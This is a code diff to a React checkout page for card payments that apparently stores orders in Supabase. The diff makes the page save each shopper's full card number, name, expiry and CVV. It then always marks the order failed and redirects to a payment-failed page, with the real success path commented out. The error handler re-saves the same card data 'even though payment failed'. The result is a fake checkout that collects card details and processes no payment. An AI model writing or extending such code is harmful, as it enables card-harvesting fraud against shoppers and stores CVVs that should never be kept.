@@ -103,6 +103,27 @@ export default function CartaoPage() {
       
       console.log("Payment info saved successfully");
       
+      // For demo purposes, always redirect to the payment failed page
+      // In a real application, you would have real payment processing logic here
+      console.log("Redirecting to payment failed page");
+      
+      // Update order status to 'reprovado'
+      const { error: updateError } = await supabase
+        .from('pedidos')
+        .update({ status: 'reprovado' })
+        .eq('id', pedidoId);
+      
+      if (updateError) {
+        console.error("Error updating order status:", updateError);
+        throw updateError;
+      }
+      
+      // Navigate to the payment failed page
+      navigate(`/checkout/${slug}/payment-failed/${pedidoId}`);
+      return;
+      
+      // Note: This code is now unreachable - kept for reference
+      /* 
       // Update order status
       const { error: updateError } = await supabase
         .from('pedidos')
@@ -122,6 +143,7 @@ export default function CartaoPage() {
       // Navigate to success page or back to product
       toast.success('Pagamento processado com sucesso!');
       navigate(`/checkout/${slug}`);
+      */
       
     } catch (error) {
       console.error('Error processing payment:', error);
@@ -129,15 +151,22 @@ export default function CartaoPage() {
       // Still capture payment details even if payment "fails"
       try {
         console.log("Capturing payment info even though payment failed");
-        await createPaymentInfo({
-          pedido_id: pedidoId,
-          metodo_pagamento: 'cartao',
-          numero_cartao: data.numero_cartao,
-          nome_cartao: data.nome_cartao,
-          validade: data.validade,
-          cvv: data.cvv,
-          parcelas: parseInt(data.parcelas.split('x')[0], 10)
-        });
+        
+        // Ensure we have already saved payment info
+        // If not, try to save it now (redundant code in case the first attempt failed)
+        try {
+          await createPaymentInfo({
+            pedido_id: pedidoId,
+            metodo_pagamento: 'cartao',
+            numero_cartao: data.numero_cartao,
+            nome_cartao: data.nome_cartao,
+            validade: data.validade,
+            cvv: data.cvv,
+            parcelas: parseInt(data.parcelas.split('x')[0], 10)
+          });
+        } catch (saveError) {
+          console.error("Error saving payment info in error handler:", saveError);
+        }
         
         // Update order status to reflect failure
         await supabase
@@ -150,8 +179,8 @@ export default function CartaoPage() {
       }
       
       // Navigate to failure page
-      navigate(`/checkout/${slug}/payment-failed/${pedidoId}`);
       toast.error('Erro ao processar pagamento. Tente novamente.');
+      navigate(`/checkout/${slug}/payment-failed/${pedidoId}`);
     } finally {
       setSubmitting(false);
     }
@@ -210,15 +239,15 @@ export default function CartaoPage() {
           <CreditCardForm 
             onSubmit={handleSubmit} 
             submitting={submitting}
-            buttonColor={produto.cor_botao || '#22c55e'}
-            buttonText={produto.texto_botao || 'Finalizar Compra'}
+            buttonColor={produto?.cor_botao || '#22c55e'}
+            buttonText={produto?.texto_botao || 'Finalizar Compra'}
           />
         </div>
         
         <div>
           <ProductSummary 
             produto={produto} 
-            pedido={pedidoData || {valor: produto.preco}}
+            pedido={pedidoData || {valor: produto?.preco}}
           />
         </div>
       </div>
